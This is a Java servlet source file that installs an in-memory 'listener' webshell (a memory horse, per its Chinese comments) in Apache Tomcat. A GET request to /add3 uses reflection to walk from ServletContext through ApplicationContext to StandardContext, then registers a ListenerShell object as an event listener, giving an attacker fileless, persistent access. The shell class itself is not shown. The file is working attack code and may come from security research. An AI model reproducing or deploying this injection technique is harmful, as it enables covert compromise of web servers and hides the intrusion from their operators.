package cn.safe6.action;

import cn.safe6.listener.ListenerShell;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

/**
 * Listener内存马添加
 */
@WebServlet("/add3")
public class AddShellListener extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        try {
            //先拿到ServletContext
            ServletContext servletContext = req.getServletContext();
            Field appctx =servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);

            //从ServletContext里面拿到ApplicationContext
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field atx= applicationContext.getClass().getDeclaredField("context");
            atx.setAccessible(true);
            //从ApplicationContext里面拿到StandardContext
            StandardContext standardContext = (StandardContext) atx.get(applicationContext);

            //准备listener马
            ListenerShell listenerShell = new ListenerShell();
            //添加到上下文
            standardContext.addApplicationEventListener(listenerShell);


            resp.getWriter().write("add success!");
            return;

        } catch (Exception e) {
            e.printStackTrace();
        }
        resp.getWriter().write("add failed!");

    }
}
